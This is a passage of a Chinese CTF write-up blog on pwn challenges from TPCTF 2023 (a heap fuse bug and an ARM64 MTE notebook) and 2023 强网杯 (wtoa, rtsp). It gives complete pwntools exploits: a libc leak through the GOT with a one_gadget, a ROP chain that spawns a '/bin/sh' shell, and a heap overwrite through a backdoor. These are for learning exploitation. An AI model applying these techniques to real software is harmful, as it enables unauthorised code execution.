class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Sign the name of the new owner here:\n&#x27;</span>,name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">drop_ruby</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">take_rod</span>(<span class="hljs-params">name</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Sign the name of the new owner here:\n&#x27;</span>,name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">drop_rod</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fuse</span>(<span class="hljs-params">name</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Sign the name of the one who wants to fuse this new weapon here:\n&#x27;</span>,name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">drop</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exitt</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;7&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">default</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;8&#x27;</span>)<br><br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>take_rod(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x781</span>)<br>take_ruby(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">4</span>)<br>fuse(<span class="hljs-string">b&#x27;c&#x27;</span>)<br>drop()<br>drop_rod()<br>p.interactive()<br></code></pre></td></tr></table></figure><img src="/2024/01/28/2023TPCTFpwnwp/crash.png" class title="crash"><ul><li>好像是把ruby和rod拼接后drop_rod寄了，先拼的ruby再拼的rod，实际执行的就是 (*ruby_name)(ruby_name)，令ruby_name为printf的got表地址就能泄露libc基址了</li><li>没开pie+aslr部分开启，堆基址是不变的，可以先把one_gadget的地址写到堆上，再令ruby_name为这个堆地址</li></ul><p>ps：比赛的时候我没有试过drop之后drop_rod，也没有试过长输入(lll￢ω￢)，记住了</p><h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">take_ruby</span>(<span class="hljs-params">name</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Sign the name of the new owner here:\n&#x27;</span>,name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">drop_ruby</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">take_rod</span>(<span class="hljs-params">name</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Sign the name of the new owner here:\n&#x27;</span>,name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">drop_rod</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fuse</span>(<span class="hljs-params">name</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Sign the name of the one who wants to fuse this new weapon here:\n&#x27;</span>,name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">drop</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exitt</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;7&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">default</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;8&#x27;</span>)<br><br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>take_rod(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x781</span>)<br>take_ruby(p64(elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]))<br>fuse(<span class="hljs-string">b&#x27;c&#x27;</span>)<br>drop()<br>drop_rod()<br>libcbase=u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-libc.symbols[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>one_addr=libcbase+<span class="hljs-number">0xe6aee</span><br>take_rod(p64(one_addr)+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x781</span>-<span class="hljs-number">8</span>))<br>take_ruby(p64(<span class="hljs-number">0x44ba80</span>))<br>fuse(<span class="hljs-string">b&#x27;d&#x27;</span>)<br>drop()<br>drop_rod()<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="mte-notebook"><a href="#mte-notebook" class="headerlink" title="mte notebook"></a>mte notebook</h1><p>调试起来好慢&#x2F;(ㄒoㄒ)&#x2F;~~</p><h2 id="arm64-mte"><a href="#arm64-mte" class="headerlink" title="arm64 mte"></a>arm64 mte</h2><p><em>一些个人理解</em></p><p>flag1可以帮助理解一下mte</p><ul><li><p>将指针的最高字节作为tag使用，如果指针的tag和之前打的tag不符则报错</p><img src="/2024/01/28/2023TPCTFpwnwp/tag.png" class title="tag"><p>比如malloc一块内存，返回的指针最高字节就是打上的tag，使用指针的时候应该使用 <strong>0x600ffff9bc768b0</strong> 而不是 <strong>0xffff9bc768b0</strong></p></li><li><p>打tag通过软件进行，tag的验证通过硬件进行</p><ul><li><p>tag的验证猜测通过在内存访问（ldr &#x2F; str）时，同步检测tag是否匹配</p></li><li><p>可以通过 <strong>STG</strong> 指令打tag（tag的粒度为16字节），flag1中有这个过程</p><p>flag1的前16字节的tag是flag1的第一个字节</p><img src="/2024/01/28/2023TPCTFpwnwp/flag1.png" class title="flag1"><p>接下来的tag分别是flag1的第4，8，12字节的低4bit</p><p>可以通过以上tag的指针获取flag1</p><img src="/2024/01/28/2023TPCTFpwnwp/flag111.png" class title="flag111"></li></ul></li><li><p>搜索STG指令可以看到一个专门用于打tag的函数</p><img src="/2024/01/28/2023TPCTFpwnwp/tagregion.png" class title="tagregion"><p>在malloc和free中都调用了这个函数</p><img src="/2024/01/28/2023TPCTFpwnwp/malloc.png" class title="malloc"><img src="/2024/01/28/2023TPCTFpwnwp/free.png" class title="free"><ul><li>malloc会给返回的指针打上tag</li><li>free后会重新打tag，所以使用free后的内存会报错</li></ul><img src="/2024/01/28/2023TPCTFpwnwp/tagtag.jpg" class title="tagtag"></li></ul><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>由于调试太慢失去耐心所以没自己搓exp，直接调试一遍<a href="https://blog.xmcve.com/2023/11/28/TPCTF2023-Writeup/#title-5">星盟的exp</a></p><p>利用的根据</p><ul><li>malloc的内存都打了tag，利用overlap会使用未打tag的内存，报错</li><li>free后会重新打tag，uaf之后使用的指针的tag是malloc的tag，报错</li><li>堆以外的地址（比如main_arena）没打tag可以使用，之前泄露了栈地址，可以到栈上写rop链</li></ul><p>两个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">note</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-type">char</span> title[<span class="hljs-number">16</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> * <span class="hljs-title">page</span>;</span><br>    <span class="hljs-type">char</span> description[<span class="hljs-number">96</span>];<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span>* <span class="hljs-title">next</span>;</span><br>    <span class="hljs-type">char</span>content[<span class="hljs-number">96</span>];<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>10个note</p><img src="/2024/01/28/2023TPCTFpwnwp/note.png" class title="note"></li><li><p>先drop掉0~7的note，填满tcache，把note[7]放进unsorted bin</p><img src="/2024/01/28/2023TPCTFpwnwp/bin.png" class title="bin"></li><li><p>把note[7]申请回来作为page，note是0x90，page是0x80，但如果从0x90中分割0x80那么剩下0x10不足0x10，所以会直接返回0x90的note</p><img src="/2024/01/28/2023TPCTFpwnwp/page.png" class title="page"><p>由于未初始化漏洞unsorted chunk的bk就是struct page的next，伪造需要写0x18字节，所以前移3页</p><p>伪造完的page</p><img src="/2024/01/28/2023TPCTFpwnwp/page1.png" class title="page1"></li><li><p>一样的步骤，这次把note[8]释放掉，写rop链，overwrite_page结束后开始rop链</p><img src="/2024/01/28/2023TPCTFpwnwp/rop.png" class title="rop"><p>rop链就是利用 <strong>svc #0</strong> 进行系统调用</p><img src="/2024/01/28/2023TPCTFpwnwp/syscall.png" class title="syscall"></li></ul><h2 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;arm64&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">choosenote</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readpage</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">editpage</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> data:<br>        p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">hex</span>(item)[<span class="hljs-number">2</span>:].encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">nextpage</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">addpage</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dropnote</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;6&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exitt</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;7&#x27;</span>)<br><br>p=process(<span class="hljs-string">&#x27;./run.sh&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;I\&#x27;ve put flag1 in 0x&#x27;</span>)<br>flag1=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;,&#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(flag1))<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    choosenote(i)<br>    dropnote()<br><br>choosenote(<span class="hljs-number">9</span>)<br>addpage()<br>nextpage()<br>nextpage()<br>nextpage()<br><br>editpage([<span class="hljs-number">0x61</span>, flag1-<span class="hljs-number">0x90</span>, <span class="hljs-number">0</span>])<br>choosenote(<span class="hljs-number">8</span>)<br>dropnote()<br>choosenote(<span class="hljs-number">9</span>)<br>addpage()<br>nextpage()<br>nextpage()<br>nextpage()<br><br>editpage([<span class="hljs-number">0x61</span>, <span class="hljs-number">0x4521b8</span>, <span class="hljs-number">1</span>, flag1-<span class="hljs-number">0x80</span>+<span class="hljs-number">0x10</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0x42629c</span>, flag1+<span class="hljs-number">0x1d0</span>, <span class="hljs-number">6</span>, flag1] + [i + <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0xb</span>)] + [<span class="hljs-number">0x400260</span>] + [i + <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0xa</span>)] + [<span class="hljs-number">0x45d028</span>, <span class="hljs-number">221</span>] + [i + <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x1c</span>)] + [<span class="hljs-number">0x41a628</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0x4521b8</span>, <span class="hljs-number">0x413c64</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x413c64</span>, flag1+<span class="hljs-number">0x1c8</span>] + [<span class="hljs-number">0x68732f6e69622f</span>, flag1+<span class="hljs-number">0x1c8</span>, <span class="hljs-number">0</span>])<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023 强网杯线上赛 pwn wp</title>
    <link href="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/"/>
    <url>/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/</url>
    
    <content type="html"><![CDATA[<p>最自闭的一场</p><p>只写了比赛的时候没做出来的，解数比较多的两道</p><span id="more"></span><h1 id="wtoa"><a href="#wtoa" class="headerlink" title="wtoa"></a>wtoa</h1><p>wasmtime Ahead-Of-Time（AOT）预编译WASM源码生成的JIT代码</p><p>里面本质还是可执行的机器码，经调试发现大概是wasmtime会调用wtoa里的代码，wtoa又会调用wasmtime的一些接口用于输入输出之类的</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/vmmapwtoa.png" class title="vmmapwtoa"><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/bt1.png" class title="bt1"><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/bt2.png" class title="bt2"><h2 id="逆向-amp-调试"><a href="#逆向-amp-调试" class="headerlink" title="逆向 &amp; 调试"></a>逆向 &amp; 调试</h2><p>学到一个新操作，IDA View-&gt;Graphs-&gt;Function Calls能看函数调用图，由于这个题看着像个菜单</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/wtoa.png" class title="wtoa"><p>这个函数看着像菜单的起点（也确实是），康康</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/graph.png" class title="graph"><p><em>ps：其实比赛的时候夏爹已经逆到这了，tql！</em></p><p>先看看程序的功能</p><ul><li><p>Add</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/add.png" class title="add"></li><li><p>Edit</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/edit.png" class title="edit"></li><li><p>Delete</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/delete.png" class title="delete"></li><li><p>Show</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/show.png" class title="show"></li></ul><p>浅浅调试一下，<strong>IDA内的地址是gdb的相对地址+0x1000</strong></p><p>这个应该是输入的地方</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/input.png" class title="input"><ul><li>v5：rbx</li><li>v4：r15</li></ul><p>应该是只取输入的两字节，进行操作的判断，然后就是各个功能对应的函数</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/aaa.png" class title="aaa"><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/aa.png" class title="aa"><p>可以看出我们想要的flag就在下面</p><p>反编译可以看出寻址都是按基址+段内偏移进行的，堆块的管理大概是这样的↓</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/chunk.png" class title="chunk"><p>edit中有个后门，length为3428913的时候可以将当前堆块的内容扩写为48字节</p><p>当add两个note的时候note1的chunk就在note0的data上面，直接将note1-&gt;buffer指向flag，size改大再show note1就行</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/tele.png" class title="tele"><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice &gt; &#x27;</span>,<span class="hljs-string">b&#x27;A&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(data)).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27; &gt; &#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx,offset,length</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice &gt; &#x27;</span>,<span class="hljs-string">b&#x27;S&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;offset&#x27;</span>,<span class="hljs-built_in">str</span>(offset).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;length&#x27;</span>,<span class="hljs-built_in">str</span>(length).encode())<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,offset,data,length</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice &gt; &#x27;</span>,<span class="hljs-string">b&#x27;E&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;offset&#x27;</span>,<span class="hljs-built_in">str</span>(offset).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;length&#x27;</span>,<span class="hljs-built_in">str</span>(length).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27; &gt; &#x27;</span>,data)<br><br>p=process(<span class="hljs-string">&#x27;./launch.sh&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(<span class="hljs-number">0x1300000000</span>)+p64(<span class="hljs-number">0x00501cd800501ca0</span>)+p64(<span class="hljs-number">0x1b00000000</span>)+p64(<span class="hljs-number">0x501b40</span>)+p64(<span class="hljs-number">0x100</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,payload,<span class="hljs-number">3428913</span>)<br>show(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x50</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="rtsp"><a href="#rtsp" class="headerlink" title="rtsp"></a>rtsp</h1><p>非常好中文路径~~~&#x2F;&#x2F;&#x2F;(^v^)\\\~~~</p><h2 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h2><ul><li><p>没开canary</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/checksec.png" class title="checksec"></li><li><p>字符串大法好，live555开源库，源码get √</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">.rodata:0000000000081CE300000018CLIVE555 Streaming Media<br></code></pre></td></tr></table></figure></li><li><p>rtsp协议类似http，有各种方法如SETUP，GET_PARAMERTER，PAUSE等，一个报文类似这样👇</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">GET_PARAMETER rtsp://192.168.111.143:8554/* RTSP/1.0<br>Session: 3E1B7756<br>CSeq: 1<br>GET_INFO: 2023<br></code></pre></td></tr></table></figure></li></ul><h2 id="各种后门"><a href="#各种后门" class="headerlink" title="各种后门"></a>各种后门</h2><ul><li><p>有源码所以可以编一个bindiff，猜测会在各个方法的处理函数里进行改动，所以滤一波handleCmd（这个思路挺牛逼的）</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/handlecmd.png" class title="handlecmd"></li><li><p>或者字符串中也能看到一些奇怪的字符串</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">.rodata:000000000007B39B0000001CC100 maybe you need this %p\n<br>.rodata:000000000007B3C800000022C100 you may want to get more flag<br>.rodata:000000000007B40B0000000CCvul_string:<br><br>.rodata:000000000007B3F9 aQwb            db &#x27;qwb&#x27;,0 <br></code></pre></td></tr></table></figure></li></ul><p>一共三个后门</p><ul><li><p>handleCmd_GET_PARAMETER获取一个程序地址</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/backdoor1.png" class title="backdoor1"></li><li><p>handleCmd_SET_PARAMETER可以设置一个标志位</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/backdoor2.png" class title="backdoor2"></li><li><p>handleCmd_DESCRIBE设置标志位后存在溢出</p><img 